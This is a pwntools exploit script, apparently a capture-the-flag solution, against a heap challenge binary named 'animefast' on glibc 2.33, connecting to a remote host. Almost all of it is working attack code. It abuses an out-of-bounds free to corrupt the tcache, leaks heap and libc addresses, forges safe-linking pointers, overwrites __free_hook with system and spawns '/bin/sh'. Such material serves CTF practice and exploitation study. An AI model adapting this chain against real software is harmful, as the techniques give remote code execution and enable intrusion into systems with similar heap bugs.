from pwn import *

#init

e = ELF('./animefast')
libc = ELF('./libc-2.33.so')

context.binary = e

#p = process(e.path)
p = remote('143.198.127.103', 42008)

#funcs

def adda(s = 'title', t = 'description'):
    p.sendlineafter('?', '1')
    p.sendlineafter('?', s)
    p.sendlineafter('?', t)

def addc(x, s = 'character'):
    p.sendlineafter('?', '2')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', s)

def frec(x, y):
    p.sendlineafter('?', '3')
    p.sendlineafter('?', str(x))
    p.sendlineafter('?', str(y))

def rda(x):
    p.sendlineafter('?', '4')
    p.recvuntil('Anime #' + str(x) + ': ')
    return p.recvline(keepends = False)

def ptr(x):
    return p64(x ^ (heap >> 0xc))

#vars

arena_off = 0x1e0c00
freehook_off = libc.sym['__free_hook']
system_off = libc.sym['system']

log.info('Arena libc off: ' + hex(arena_off))
log.info('Freehook libc off: ' + hex(freehook_off))
log.info('System libc off: ' + hex(system_off))

#exploit

#free tcache_perthread_struct which is key of freed tcache using oob index access

adda()

for i in range(0x9):
    addc(0x1)

for i in reversed(range(0x7)):
    frec(0x1, i)

frec(0x1, 0x49)

#add anime over perthread and make 0x290 tcache full then free it to get heap leak with libc pointer

adda('a', b'a' * 0x70 + b'\x50')

frec(0x1, 0x49 + 0x6)

heap = (u64(rda(0x2).ljust(0x8, b'\x00')) >> 0xc) << 0xc

log.info('Heap adr: ' + hex(heap))

#free fake chnk to get pointer to top of heap on ptr to next 0x30 chnk and write pointer to libc leak

addc(0x1, b'a' * 0x8 + b'\x30')
addc(0x1, b'a' * 0x8 + b'\x50')
addc(0x1, p64(heap + 0xb20))
addc(0x1, p64(heap + 0x90))
addc(0x1, p64(heap + 0xb50))
addc(0x1, p64(heap + 0x810))
addc(0x1, p64(heap + 0x90))

frec(0x1, 0x48 + 6 * 0x6)
frec(0x1, 0x48 + 5 * 0x6)

addc(0x1, p64(heap + 0x819))

libc_off = (u64(rda(0x2).ljust(0x8, b'\x00')) << 0x8) - arena_off

log.info('Libc off adr: ' + hex(libc_off))

#use fake chnk again to get pointer on top of heap to make tcache 0x30 bin not full

frec(0x1, 0x48 + 4 * 0x6)
frec(0x1, 0x48 + 3 * 0x6)

addc(0x1, b'a' * 0x2 + b'\x01')

#create ptr to overwrite freehook with system on fake chnk that u can uaf

frec(0x1, 0x48 + 2 * 0x6)
frec(0x1, 0x0)

addc(0x1, b'a' * 0x10 + ptr(libc_off + freehook_off))
addc(0x1, '/bin/sh')
addc(0x1, p64(libc_off + system_off))

#call system('/bin/sh')

frec(0x1, 0x4)

#pray for flag

p.interactive()
